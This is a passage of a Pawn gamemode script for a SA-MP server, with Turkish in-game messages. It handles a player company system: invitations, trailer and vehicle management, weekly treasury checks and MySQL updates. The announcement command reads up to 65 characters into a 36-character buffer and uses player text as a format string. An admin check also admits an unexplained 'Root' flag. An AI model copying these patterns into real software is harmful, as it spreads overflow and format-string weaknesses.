	new Yazi[256];
	format(Yazi, 256, "{00FF00}%s {F8F8FF}size {00FF00}%s {F8F8FF}þirketine katýlma daveti gönderdi.\n{F8F8FF}Kabul ediyor musunuz?", GetName(playerid), Sirketler[ Sirket[playerid] ][SirketName]);
	ShowPlayerDialog(id, DialogSirketTeklif, DIALOG_STYLE_MSGBOX, "{00FF00}Þirket Teklifi", Yazi, "Evet", "Hayýr");

	format(Yazi, 256, "{00FF00}Þirket teklifiniz %s'a iletildi.", GetName(id));
	SendClientMessage(playerid, -1, Yazi);
	return 1;
}

CMD:uyeat(playerid, params[])
{
	SendClientMessage(playerid, -1, "{FF0000}Bu komut v4.0.0'da kaldýrýlmýþtýr. Þirketten üye atmak için {F8F8FF}/sirket -> Üye Listesi");
	return 1;
}

CMD:rutbever(playerid, params[])
{
	SendClientMessage(playerid, -1, "{FF0000}Bu komut v4.0.0'da kaldýrýlmýþtýr. Üye rütbesi deðiþtirmek için {F8F8FF}/sirket -> Üye Listesi");
	return 1;
}

CMD:maasver(playerid, params[])
{
	SendClientMessage(playerid, -1, "{FF0000}Bu komut v4.0.0'da kaldýrýlmýþtýr. Üyeye maaþ vermek için {F8F8FF}/sirket -> Üye Listesi");
	return 1;
}

CMD:katkisifirla(playerid, params[])
{
	SendClientMessage(playerid, -1, "{FF0000}Bu komut v4.0.0'da kaldýrýlmýþtýr. Üye katkýsý sýfýrlamak için {F8F8FF}/sirket -> Üye Listesi");
	return 1;
}

CMD:asdorsesil(playerid, params[])
{
	SendAdminText(playerid, "/asdorsesil", params);
	if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
	{
			new Yazi[256];
			format(Yazi, 256, "{F8F8FF}ADMIN {00FF00}%s, {F8F8FF}tum þirket dorselerini respawn  etti.", GetName(playerid));

	    	for(new traileri = 0; traileri < MAX_PLAYERS;traileri++)
			{
				DestroyVehicle(SirketDorse[traileri]);
				SirketDorse[traileri] = -1;
	   		}
	}
	return 1;
}

CMD:srespawncars(playerid, params[])
{
	SendAdminText(playerid, "/srespawncars", params);
	if(Sirket[playerid] == -1 || SirketRutbe[playerid] < 3) return SendClientMessage(playerid, -1, "{FF0000}Bu komutu sadece Þirket Sahipleri kullanabilir.");

	new Yazi[256];
	format(Yazi, 256, "{F8F8FF}Þirket Sahibi {00FF00}%s, {F8F8FF}þirket araçlarýný respawn etti.", GetName(playerid));

	foreach(new i:SAs)
	{
 		if(SirketAraba[i][SAExist] != 1) continue;
		if(SirketAraba[i][SASirketID] == Sirket[playerid])
  		{
			if(GetVehicleDriver31(SirketAraba[i][SAAID]) == -1)
			{
				SetVehicleToRespawn(SirketAraba[i][SAAID]);
			}
   		}
	}


	foreach(new i:Player)
	{
	    if(Sirket[i] == Sirket[playerid])
	    {
	        SendClientMessage(i, -1, Yazi);
	    }
	}
	return 1;
}
CMD:setsirketduyuru(playerid, params[])
{
	SendAdminText(playerid, "/setsirketduyuru", params);
	if(Sirket[playerid] == -1 || SirketRutbe[playerid] < 3) return SendClientMessage(playerid, -1, "{FF0000}Bu komutu sadece Þirket Sahipleri kullanabilir.");

    new Duyuru[36];
    if(sscanf(params, "s[65]", Duyuru))return SendSyntaxMessage(playerid, "/setsirketduyuru <Duyuru>");
	if(strlen(params) > 36)return SendClientMessage(playerid, 0xFF0000AA, "Þirket duyurusu en fazla 36 karakter olabilir.");
	new Yazi[256];
	format(Yazi, 256, "{F8F8FF}Þirket Sahibi {00FF00}%s, {F8F8FF}þirket duyurusunu güncelledi.", GetName(playerid));

	format(Sirketler[Sirket[playerid]][SirketDuyuru], 256, Duyuru);

	foreach(new i:Player)
	{
	    if(Sirket[i] == Sirket[playerid])
	    {
	        SendClientMessage(i, -1, Yazi);
	    }
	}
	return 1;
}
CMD:sirket(playerid, params[])
{
	SendAdminText(playerid, "/sirket", params);
	if(Sirket[playerid] == -1) return SendClientMessage(playerid, -1, "{FF0000}Bu komutu sadece bir þirkette bulunanlar kullanabilir!");
    ShowSirketHomeDialog(playerid);
	return 1;
}

CMD:sirketdorse(playerid, params[])
{
	SendAdminText(playerid, "/sirketdorse", params);
	if(Sirket[playerid] == -1) return SendClientMessage(playerid, -1, "{FF0000}Bu komutu sadece bir þirkette bulunanlar kullanabilir!");

	new Float:oX, Float:oY, Float:oZ;
	GetPlayerPos(playerid, oX, oY, oZ);
	if(oX < Sirketler[ Sirket[playerid] ][SirketMinX] || oY < Sirketler[ Sirket[playerid] ][SirketMinY] || oX > Sirketler[ Sirket[playerid] ][SirketMaxX] || oY > Sirketler[ Sirket[playerid] ][SirketMaxY]) return SendClientMessage(playerid, -1, "{FF0000}Bu komutu sadece þirket HQ'sunun içinde kullanabilirsiniz.");

	ShowPlayerDialog(playerid, DialogSirketDorse, DIALOG_STYLE_LIST, "{00FF00}Þirket Dorsesi Ýndir", "{FF0000}=> {F8F8FF}Kargo Dorsesi\n{FF0000}=> {F8F8FF}Sývý Dorsesi\n{FF0000}=> {F8F8FF}Maden Dorsesi", "Ýndir", "Ýptal");
	return 1;
}

CMD:sapark(playerid, params[])
{
	SendAdminText(playerid, "/sapark", params);
	if(Sirket[playerid] == -1 || SirketRutbe[playerid] < 3) return SendClientMessage(playerid, -1, "{FF0000}Bu komutu sadece Þirket Sahipleri kullanabilir.");
	if(!IsPlayerInAnyVehicle(playerid) || SirketAraba[ ArabaSirket[ GetPlayerVehicleID(playerid) ] ][SASirketID] != Sirket[playerid]) return SendClientMessage(playerid, -1, "{FF0000}Bu araç sizin þirketinize ait deðil!");
	new Float:oX, Float:oY, Float:oZ;
	GetPlayerPos(playerid, oX, oY, oZ);
	if(oX < Sirketler[ Sirket[playerid] ][SirketMinX] || oY < Sirketler[ Sirket[playerid] ][SirketMinY] || oX > Sirketler[ Sirket[playerid] ][SirketMaxX] || oY > Sirketler[ Sirket[playerid] ][SirketMaxY]) return SendClientMessage(playerid, -1, "{FF0000}Þirket aracýný sadece þirket HQ'sunda park edebilirsiniz.");
	new SAAAAAID;
	SAAAAAID = ArabaSirket[ GetPlayerVehicleID(playerid) ];
	GetVehiclePos(GetPlayerVehicleID(playerid), SirketAraba[SAAAAAID][SAX], SirketAraba[SAAAAAID][SAY], SirketAraba[SAAAAAID][SAZ]);
	GetVehicleZAngle(GetPlayerVehicleID(playerid), SirketAraba[SAAAAAID][SARZ]);
    SirketAraba[SAAAAAID][SANeedSave] = 1;
    ArabaSirket[ SirketAraba[SAAAAAID][SAAID] ] = -1;
	DestroyVehicle(SirketAraba[SAAAAAID][SAAID]);
	SirketAraba[SAAAAAID][SAAID] = Vehicle_Create(SirketAraba[SAAAAAID][SAModel], SirketAraba[SAAAAAID][SAX], SirketAraba[SAAAAAID][SAY], SirketAraba[SAAAAAID][SAZ], SirketAraba[SAAAAAID][SARZ], Sirketler[ SirketAraba[SAAAAAID][SASirketID] ][SirketRenk1], Sirketler[ SirketAraba[SAAAAAID][SASirketID] ][SirketRenk2], -1);
	ArabaSirket[ SirketAraba[SAAAAAID][SAAID] ] = SAAAAAID;
	Attach3DTextLabelToVehicle(SirketAraba[SAAAAAID][SA3D], SirketAraba[SAAAAAID][SAAID], 0.0, 0.0, 0.0);
	PutPlayerInVehicle(playerid, SirketAraba[SAAAAAID][SAAID], 0);
	
	new querys[512];
	format(querys, 512, "UPDATE sirketaraclar SET X='%f', Y='%f', Z='%f' , RZ='%f' WHERE ID = %d", SirketAraba[SAAAAAID][SAX], SirketAraba[SAAAAAID][SAY], SirketAraba[SAAAAAID][SAZ], SirketAraba[SAAAAAID][SARZ], SAAAAAID);
	mysql_query(Connection, querys);
	
	SendClientMessage(playerid, -1, "{00FF00}Þirket aracýný bulunduðunuz yere park ettiniz.");
	return 1;
}

GetOnlineSirketUye(SirketID)
{
	new Sonuc;
	foreach(new i : Player)
	{
	    if(Sirket[i] == SirketID) Sonuc++;
	}
	return Sonuc;
}

forward SirketKapiControl();
public SirketKapiControl()
{
	new GateAc;
	foreach(new SirketID:SRKTs)
	{
		if(Sirketler[SirketID][SirketExist] != 1) continue;
		foreach(new i:Player)
		{
		    if(Sirket[i] == SirketID && IsPlayerInRangeOfPoint(i, 10.0, Sirketler[SirketID][SirketGateX], Sirketler[SirketID][SirketGateY], Sirketler[SirketID][SirketGateZ]))
		    {
		        GateAc = 1;
		        break;
		    }
		}

		if(GateAc == 1)
		{
			MoveDynamicObject(Sirketler[SirketID][SirketGate], Sirketler[SirketID][SirketGateX], Sirketler[SirketID][SirketGateY], Sirketler[SirketID][SirketGateZ]-10.0, 5.0, Sirketler[SirketID][SirketGateRX], Sirketler[SirketID][SirketGateRY], Sirketler[SirketID][SirketGateRZ]);
			GateAc = 0;
		}else{
		    MoveDynamicObject(Sirketler[SirketID][SirketGate], Sirketler[SirketID][SirketGateX], Sirketler[SirketID][SirketGateY], Sirketler[SirketID][SirketGateZ], 5.0, Sirketler[SirketID][SirketGateRX], Sirketler[SirketID][SirketGateRY], Sirketler[SirketID][SirketGateRZ]);
		}
	}
	return 1;
}

SendSirketMessage(SirketID, MSG[])
{
	foreach(new i:Player)
	{
	    if(Sirket[i] == SirketID)
	    {
	        SendClientMessage(i, -1, MSG);
	    }
	}
}

forward SirketDolumControl();
public SirketDolumControl()
{
	new BolunenBilgi[3][5], year, month, day;
	getdate(year, month, day);

	foreach(new i:SRKTs)
	{
		if(Sirketler[i][SirketExist] != 1) continue;
		if(!strcmp("Yok", Sirketler[i][SirketDolum], true)) continue;

		split(Sirketler[i][SirketDolum], BolunenBilgi, '.');

		if(year > strval(BolunenBilgi[2]))
		{
  			if(Sirketler[i][SirketKasa] < Sirketler[i][SirketDeger])
  			{
  			    if(Sirketler[i][SirketBorc] == 1)
  			    {
  	  			    Sirketler[i][SirketKasa] = 0;
  			    	SieGoAwaySirketUyeleri(i);
  			    }else{
  			        Sirketler[i][SirketBorc] = 1;
  			        format(Sirketler[i][SirketDolum], 20, GunEkle(3, day, month, year));
  			        SendSirketMessage(i, "{00FF00}Þirketiniz bir hafta içinde deðeri kadar para toplayamadý.");
  			        SendSirketMessage(i, "{00FF00}Eðer 3 gün içinde bu parayý toplayamazsanýz þirketiniz kapanacaktýr.");
  			    }
  			}else{
  			    Sirketler[i][SirketKasa] -= Sirketler[i][SirketDeger];
  			    Sirketler[i][SirketBorc] = 0;
  			    Sirketler[i][SirketNeedSave] = 1;
  			    format(Sirketler[i][SirketDolum], 20, GunEkle(7, day, month, year));
  			}
		}else if(year == strval(BolunenBilgi[2]))
		{
  			if(month > strval(BolunenBilgi[1]))
	    	{
  				if(Sirketler[i][SirketKasa] < Sirketler[i][SirketDeger])
  				{
  			    	if(Sirketler[i][SirketBorc] == 1)
  			    	{
  	  			    	Sirketler[i][SirketKasa] = 0;
  			    		SieGoAwaySirketUyeleri(i);
  			    	}else{
  			        	Sirketler[i][SirketBorc] = 1;
  			       	 	format(Sirketler[i][SirketDolum], 20, GunEkle(3, day, month, year));
  			        	SendSirketMessage(i, "{00FF00}Þirketiniz bir hafta içinde deðeri kadar para toplayamadý.");
  			        	SendSirketMessage(i, "{00FF00}Eðer 3 gün içinde bu parayý toplayamazsanýz þirketiniz kapanacaktýr.");
  			    	}
  				}else{
  			    	Sirketler[i][SirketKasa] -= Sirketler[i][SirketDeger];
       			    Sirketler[i][SirketBorc] = 0;
  			    	Sirketler[i][SirketNeedSave] = 1;
  			    	format(Sirketler[i][SirketDolum], 20, GunEkle(7, day, month, year));
  				}
			}else if(month == strval(BolunenBilgi[1]))
			{
   				if(day >= strval(BolunenBilgi[0]))
			    {
  					if(Sirketler[i][SirketKasa] < Sirketler[i][SirketDeger])
  					{
  			    		if(Sirketler[i][SirketBorc] == 1)
  			    		{
  	  			    		Sirketler[i][SirketKasa] = 0;
  			    			SieGoAwaySirketUyeleri(i);
  			    		}else{
  			        		Sirketler[i][SirketBorc] = 1;
  			        		format(Sirketler[i][SirketDolum], 20, GunEkle(3, day, month, year));
  			        		SendSirketMessage(i, "{00FF00}Þirketiniz bir hafta içinde deðeri kadar para toplayamadý.");
  			        		SendSirketMessage(i, "{00FF00}Eðer 3 gün içinde bu parayý toplayamazsanýz þirketiniz kapanacaktýr.");
  			    		}
  					}else{
  			    		Sirketler[i][SirketKasa] -= Sirketler[i][SirketDeger];
     			    	Sirketler[i][SirketBorc] = 0;
  			    		Sirketler[i][SirketNeedSave] = 1;
  			    		format(Sirketler[i][SirketDolum], 20, GunEkle(7, day, month, year));
  					}
			    }
			}
		}
	}
}

SieGoAwaySirketUyeleri(SirketID)
{
	foreach(new playerid:Player)
	{
	    if(Sirket[playerid] == SirketID)
	    {
	        Sirket[playerid] = -1;
	        SirketRutbe[playerid] = 0;
			SirketKatki[playerid] = 0;
	        SendClientMessage(playerid, -1, "{F8F8FF}Þirketiniz kapatýldýðý için þirketten çýkarýldýnýz.");
	        Oyuncu_Kaydet(playerid);
	    }
	}

	new Query[200];
	format(Query, 200, "UPDATE `oyuncular` SET `Sirket`='-1', `SirketRutbe`='0', `SirketKatki`='0' WHERE `Sirket`='%d'", SirketID);
	mysql_query(Connection, Query);
}

ShowSirketHomeDialog(playerid)
{
	new DiaYazi[1024];

	format(DiaYazi, 1024, "{F8F8FF}Þirket Ýsmi: {00FF00}%s\n", Sirketler[ Sirket[playerid] ][SirketName]);
	format(DiaYazi, 1024, "%s{F8F8FF}Þirket Sahibi: {00FF00}%s\n",DiaYazi,Sirketler[ Sirket[playerid] ][SirketSahip]);
    format(DiaYazi, 1024, "%s{F8F8FF}Þirket Duyurusu\n",DiaYazi);
	if(SirketRutbe[playerid] >= 2)
	{
		format(DiaYazi, 1024, "%s{F8F8FF}Þirket Kasasý: {00FF00}%d$\n", DiaYazi, Sirketler[ Sirket[playerid] ][SirketKasa]);
		format(DiaYazi, 1024, "%s{F8F8FF}Þirket Deðeri: {00FF00}%d$\n", DiaYazi, Sirketler[ Sirket[playerid] ][SirketDeger]);
        format(DiaYazi, 1024, "%s{F8F8FF}Þirket Kontrol Günü: {00FF00}%s\n", DiaYazi, Sirketler[ Sirket[playerid] ][SirketDolum]);
	}else{
		format(DiaYazi, 1024, "%s{F8F8FF}Þirket Kasasý: {00FF00}???$\n", DiaYazi);
		format(DiaYazi, 1024, "%s{F8F8FF}Þirket Deðeri: {00FF00}???$\n", DiaYazi);
        format(DiaYazi, 1024, "%s{F8F8FF}Þirket Kontrol Günü: {00FF00}???\n", DiaYazi);
	}

	format(DiaYazi, 1024, "%s{F8F8FF}Þirket Üyeleri(Online/Hepsi): {00FF00}%d/%d\n", DiaYazi, GetOnlineSirketUye( Sirket[playerid] ), Sirketler[ Sirket[playerid] ][SirketUye]);
	format(DiaYazi, 1024, "%s{F8F8FF}Þirket Kazanç Payý: {00FF00}Yüzde %d\n", DiaYazi, Sirketler[ Sirket[playerid] ][SirketOran]);
	format(DiaYazi, 1024, "%s{F8F8FF}Þirket Araç Yönetimi\n", DiaYazi);
	format(DiaYazi, 1024, "%s{F8F8FF}Þirket Geliþtir\n", DiaYazi);
	format(DiaYazi, 1024, "%s{F8F8FF}Þirketten Ayrýl", DiaYazi);

	return ShowPlayerDialog(playerid, DialogSirketHome, DIALOG_STYLE_LIST, "{00FF00}Þirket Menüsü", DiaYazi, "Seç", "Kapat");
}


IsDorseOccupied2(vehicleid)
{
	new Yess;
	foreach(new i:Player)
	{
	    if(!IsPlayerConnected(i)) continue;
	    if(Sirket[i] == -1) continue;
	    if(SirketDorse[i] == -1) continue;
		if(SirketDorse[i] == vehicleid)
		{
		    Yess = 1;
		    continue;
		}
	}
	return Yess;
}

// GetPlayerID
GetPlayerID(name[])
{
	new Sonuc = -1;
	foreach(new i:Player)
	{
	    if(!strcmp(name, GetName(i), true))
	    {
			Sonuc = i;
			break;
	    }
	}
	return Sonuc;
}


SirketDialogs(playerid, dialogid, response, listitem, inputtext[])
{
	new DiaYazi[1024];

	if(dialogid == DialogSirketDorse)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: // Kargo
	            {
	                if(SirketDorse[playerid] != -1)
					{
						DestroyVehicle(SirketDorse[playerid]);
					}
					SirketDorse[playerid] = Vehicle_Create(VehicleTrailerCargo, Sirketler[ Sirket[playerid] ][SirketKasaX], Sirketler[ Sirket[playerid] ][SirketKasaY], Sirketler[ Sirket[playerid] ][SirketKasaZ], Sirketler[ Sirket[playerid] ][SirketKasaRZ], 1, 1, -1);
					SendClientMessage(playerid, -1, "{F8F8FF}Þirket HQ'suna bir {00FF00}Kargo Dorsesi {F8F8FF}indirdiniz. Artýk onu kullanabilirsiniz.");
	            }

	            case 1: // Sývý
	            {
	                if(SirketDorse[playerid] != -1)
					{
						DestroyVehicle(SirketDorse[playerid]);
					}
					SirketDorse[playerid] = Vehicle_Create(VehicleTrailerFluids, Sirketler[ Sirket[playerid] ][SirketKasaX], Sirketler[ Sirket[playerid] ][SirketKasaY], Sirketler[ Sirket[playerid] ][SirketKasaZ], Sirketler[ Sirket[playerid] ][SirketKasaRZ], 1, 1, -1);
					SendClientMessage(playerid, -1, "{F8F8FF}Þirket HQ'suna bir {00FF00}Sývý Dorsesi {F8F8FF}indirdiniz. Artýk onu kullanabilirsiniz.");
	            }

	            case 2: // Maden
	            {
	                if(SirketDorse[playerid] != -1)
					{
						DestroyVehicle(SirketDorse[playerid]);
					}
					SirketDorse[playerid] = Vehicle_Create(VehicleTrailerOre, Sirketler[ Sirket[playerid] ][SirketKasaX], Sirketler[ Sirket[playerid] ][SirketKasaY], Sirketler[ Sirket[playerid] ][SirketKasaZ], Sirketler[ Sirket[playerid] ][SirketKasaRZ], 1, 1, -1);
					SendClientMessage(playerid, -1, "{F8F8FF}Þirket HQ'suna bir {00FF00}Maden Dorsesi {F8F8FF}indirdiniz. Artýk onu kullanabilirsiniz.");
	            }
	        }
	    }
	}

	if(dialogid == DialogSirketTeklif)
	{
	    if(response)
		{
			Sirket[playerid] = Sirket[ SirketTeklifEden[playerid] ];
			SirketKatki[playerid] = 0;
			SirketRutbe[playerid] = 0;
			Sirketler[ Sirket[playerid] ][SirketUye]++;
  			Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;
  			Oyuncu_Kaydet(playerid);

			format(DiaYazi, 1024, "{00FF00}%s {F8F8FF}þirketine katýldýnýz. Artýk {00FF00}/sirket {F8F8FF}yazabilirsiniz.", Sirketler[ Sirket[playerid] ][SirketName]);
			SendClientMessage(playerid, -1, DiaYazi);

			format(DiaYazi, 1024, "{00FF00}%s {F8F8FF}teklifinizi kabul etti ve þirketinize katýldý.", GetName(playerid));
			SendClientMessage(SirketTeklifEden[playerid], -1, DiaYazi);

			SirketTeklifEden[playerid] = -1;
		}else{
			format(DiaYazi, 1024, "{00FF00}%s {F8F8FF}þirketininin teklifini reddettiniz.", Sirketler[ SirketTeklifEden[playerid] ][SirketName]);
			SendClientMessage(playerid, -1, DiaYazi);

			format(DiaYazi, 1024, "{00FF00}%s {F8F8FF}teklifinizi reddetti.", GetName(playerid));
			SendClientMessage(SirketTeklifEden[playerid], -1, DiaYazi);

			SirketTeklifEden[playerid] = -1;
		}
	}

	if(dialogid == DialogSirketHome)
	{
		if(response)
		{
		    switch(listitem)
		    {
		        case 0: // Þirket Ýsmi
		        {
		            /*
		            	if(SirketRutbe[playerid] < 3) return ShowSirketHomeDialog(playerid);
		            	ShowPlayerDialog(playerid, DialogSirketIsim, DIALOG_STYLE_INPUT, "{00FF00}Þirket Ýsmi", "{F8F8FF}Þirketinizin ismini deðiþtirmek istiyorsanýz yeni ismini buraya yazýn:", "Deðiþtir", "Geri");
					*/
					ShowSirketHomeDialog(playerid);
				}

		        case 1: // Þirket Sahibi
		        {
		            ShowSirketHomeDialog(playerid);
		        }
		        case 2: // Þirket Duyuru
		        {
			   		
	            	new duyuruyazi[2000];

					format(duyuruyazi, 2000, "%s{DDDDDD}%s", duyuruyazi, Sirketler[Sirket[playerid]][SirketDuyuru]);
					format(duyuruyazi, 2000, "%s \n", duyuruyazi);
				
					ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Þirket Duyurusu", duyuruyazi, "Kapat", "");

				}

		        case 3: // Þirket Kasasý
		        {
 		            if(SirketRutbe[playerid] < 3) return ShowSirketHomeDialog(playerid);
					format(DiaYazi, 1024, "{F8F8FF}Þirket Kasasýndaki Para: {00FF00}%d$\n \n{F8F8FF}Her hafta bu paradan þirketin deðeri kadar para eksilecektir.\n{F8F8FF}Eðer kasadaki para þirket deðerinden az olursa þirketiniz kapanýr.\n{F8F8FF}Þirket kasasýndaki parayý oyunculara {00FF00}/maasver {F8F8FF}komutuyla daðýtabilirsiniz.", Sirketler[ Sirket[playerid] ][SirketKasa]);
					ShowPlayerDialog(playerid, DialogSirketMSG, DIALOG_STYLE_MSGBOX, "{00FF00}Þirket Kasasý", DiaYazi, "Geri", "");
				}

		        case 4: // Þirket Deðeri
		        {
 		            if(SirketRutbe[playerid] < 3) return ShowSirketHomeDialog(playerid);
					format(DiaYazi, 1024, "{F8F8FF}Þirket Deðeri: {00FF00}%d$\n \n{F8F8FF}Her hafta þirket kasasýndan þirketin deðeri kadar para eksilecektir.\n{F8F8FF}Eðer kasadaki para þirket deðerinden az olursa þirketiniz kapanýr.", Sirketler[ Sirket[playerid] ][SirketDeger]);
					ShowPlayerDialog(playerid, DialogSirketMSG, DIALOG_STYLE_MSGBOX, "{00FF00}Þirket Kasasý", DiaYazi, "Geri", "");
		        }

		        case 5: // Þirket Kontrol Günü
		        {
 		            if(SirketRutbe[playerid] < 3) return ShowSirketHomeDialog(playerid);
					format(DiaYazi, 1024, "{F8F8FF}Þirket Kontrol Günü: {00FF00}%s\n \n{F8F8FF}Belirtilen günde þirketinizin kasasýnda en az deðeri kadar para bulunmazsa ilk önce 3 gün uyarý süresi verilir.\n{F8F8FF}Bu süre sonunda da yeterli miktarda para bulunmazsa þirketiniz kapatýlýr.", Sirketler[ Sirket[playerid] ][SirketDolum]);
					ShowPlayerDialog(playerid, DialogSirketMSG, DIALOG_STYLE_MSGBOX, "{00FF00}Þirket Kontrol Günü", DiaYazi, "Geri", "");
		        }

		        case 6: // Þirket Üyeleri
		        {
          			SendClientMessage(playerid, -1, "{DDDDDD}Þirket üyelerinin listesi hazýrlanýyor...");

                    SirketUyeSayfa[playerid] = 0;
					format(DiaYazi, 1024, "SELECT * FROM `oyuncular` WHERE `Sirket`='%d' ORDER BY `SirketRutbe` DESC LIMIT %d, 25", Sirket[playerid], SirketUyeSayfa[playerid] * 25);
     				mysql_tquery(Connection, DiaYazi, "ShowSirketUyeList", "d", playerid);
/*
					foreach(new i:Player)
					{
					    if(Sirket[i] == Sirket[playerid])
					    {
					        format(DiaYazi, 1024, "%s{F8F8FF}%s [ %s(%d) ][ Katký %d$ ]\n", DiaYazi, GetName(i), SirketRutbeName[ SirketRutbe[i] ], SirketRutbe[i], SirketKatki[i]);
					    }
					}

					format(DiaYazi, 1024, "%s \n{F8F8FF}Üye Sayýsý / Üye Limiti = %d / %d", DiaYazi, Sirketler[ Sirket[playerid] ][SirketUye], Sirketler[ Sirket[playerid] ][SirketMaxUye]);
					format(DiaYazi, 1024, "%s\n \n{F8F8FF}Üye Yönetimi Komutlarý:\n{F8F8FF}/uyeal /uyeat /rutbever /maasver", DiaYazi);

					ShowPlayerDialog(playerid, DialogSirketMSG, DIALOG_STYLE_MSGBOX, "{00FF00}Þirketteki Online Üyeler", DiaYazi, "Geri", "");
*/
		        }

				case 7: // Þirket Kazanç Payý
				{
 		            if(SirketRutbe[playerid] < 3) return ShowSirketHomeDialog(playerid);
					format(DiaYazi, 1024, "{F8F8FF}Þirket Kazanç Payý: {00FF00}Yüzde %d\n \n{F8F8FF}Bu deðer þirket üyelerinin yaptýðý görevlerden gelen paranýn yüzde kaçýnýn þirket kasasýna gittiðini gösterir.\n{F8F8FF}Bu deðer en fazla 70 en az 30 olabilir.");
					ShowPlayerDialog(playerid, DialogSirketOran, DIALOG_STYLE_INPUT, "{00FF00}Þirket Kazanç Payý", DiaYazi, "Deðiþtir", "Geri");
				}

				case 8: // Þirket Araç Yönetimi
				{
		            if(SirketRutbe[playerid] < 3) return ShowSirketHomeDialog(playerid);
					if(GetSirketArabaCount(Sirket[playerid]) == 0) return ShowSirketHomeDialog(playerid);
				    new ZaXD;

					foreach(new i:SAs)
					{
					    if(SirketAraba[i][SAExist] != 1) continue;
					    if(SirketAraba[i][SASirketID] == Sirket[playerid])
					    {
					        format(DiaYazi, 1024, "%s{FF0000}%d# {F8F8FF}%s\n", DiaYazi, i, VehNames[ SirketAraba[i][SAModel]-400 ]);
							SAMenuItem[playerid][ZaXD] = i;
							ZaXD++;
					    }
					}

					ShowPlayerDialog(playerid, DialogSirketTir, DIALOG_STYLE_LIST, "{00FF00}Þirket Araç Yönetimi", DiaYazi, "Yönet", "Geri");
				}

		        case 9: // Þirket Geliþtir
		        {
		            if(SirketRutbe[playerid] < 3) return ShowSirketHomeDialog(playerid);
		            ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
		        }

		        case 10: // Þirketten Ayrýl
		        {
		            if(!strcmp(Sirketler[ Sirket[playerid] ][SirketSahip], GetName(playerid), true)) return SendClientMessage(playerid, -1, "{FF0000}Kendi þirketinizden ayrýlamazsýnýz! Þirketi kapatmak için yönetici ile görüþün."), ShowSirketHomeDialog(playerid);
		            ShowPlayerDialog(playerid, DialogSirketAyril, DIALOG_STYLE_MSGBOX, "{00FF00}Þirketten Ayrýl", "{F8F8FF}Gerçekten þirketten ayrýlmak istiyor musunuz?", "Evet", "Hayýr");
		        }
		    }
		}
	}

	if(dialogid == DialogSirketTir)
	{
	    if(response)
	    {
			SASItem[playerid] = listitem;
			format(DiaYazi, 1024, "{F8F8FF}Model\t\t%s\n", VehNames[ SirketAraba[ SAMenuItem[playerid][listitem] ][SAModel]-400 ]);
			format(DiaYazi, 1024, "%s{F8F8FF}Fiyat\t\t%d$\n", DiaYazi, SirketAraba[ SAMenuItem[playerid][listitem] ][SAFiyat]);
			format(DiaYazi, 1024, "%s{F8F8FF}Kullanabilecek Üye Grubu: {00FF00}%s(%d)\n", DiaYazi, SirketRutbeName[ SirketAraba[ SAMenuItem[playerid][listitem] ][SAMinRutbe] ], SirketAraba[ SAMenuItem[playerid][listitem] ][SAMinRutbe]);
			format(DiaYazi, 1024, "%s{F8F8FF}Aracý Sat\n", DiaYazi);
 			format(DiaYazi, 1024, "%s{F8F8FF}Aracý Respawn Et", DiaYazi);
 			ShowPlayerDialog(playerid, DialogSirketTirYonet, DIALOG_STYLE_LIST, "{00FF00}Týrý Yönet", DiaYazi, "Seç", "Geri");
	    }else{
	        ShowSirketHomeDialog(playerid);
	    }
	}

	if(dialogid == DialogSirketTirMinRutbe)
	{
	    if(response)
	    {
            SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAMinRutbe] = listitem;
            SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SANeedSave] = 1;
            
            new SAAAAAID;
			SAAAAAID = ArabaSirket[ SAMenuItem[playerid][ SASItem[playerid] ] ];
			new queryd[512];
			format(queryd, 512, "UPDATE sirketaraclar SET MinRutbe='%d' WHERE ID = %d", SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAMinRutbe], /*SAMenuItem[playerid][ SASItem[playerid] ]*/ SAAAAAID);
			mysql_query(Connection, queryd);

            SendClientMessage(playerid, -1, "{00FF00}Bu þirket aracýný kullanabilecek üye grubunu belirlediniz.");

			format(DiaYazi, 1024, "{F8F8FF}Model\t\t%s\n", VehNames[ SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAModel]-400 ]);
			format(DiaYazi, 1024, "%s{F8F8FF}Fiyat\t\t%d$\n", DiaYazi, SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAFiyat]);
			format(DiaYazi, 1024, "%s{F8F8FF}Kullanabilecek Üye Grubu: {00FF00}%s(%d)\n", DiaYazi, SirketRutbeName[ SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAMinRutbe] ], SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAMinRutbe]);
			format(DiaYazi, 1024, "%s{F8F8FF}Aracý Sat\n", DiaYazi);
 			format(DiaYazi, 1024, "%s{F8F8FF}Aracý Respawn Et", DiaYazi);
 			ShowPlayerDialog(playerid, DialogSirketTirYonet, DIALOG_STYLE_LIST, "{00FF00}Týrý Yönet", DiaYazi, "Seç", "Geri");
	    }else{
			format(DiaYazi, 1024, "{F8F8FF}Model\t\t%s\n", VehNames[ SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAModel]-400 ]);
			format(DiaYazi, 1024, "%s{F8F8FF}Fiyat\t\t%d$\n", DiaYazi, SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAFiyat]);
			format(DiaYazi, 1024, "%s{F8F8FF}Kullanabilecek Üye Grubu: {00FF00}%s(%d)\n", DiaYazi, SirketRutbeName[ SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAMinRutbe] ], SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAMinRutbe]);
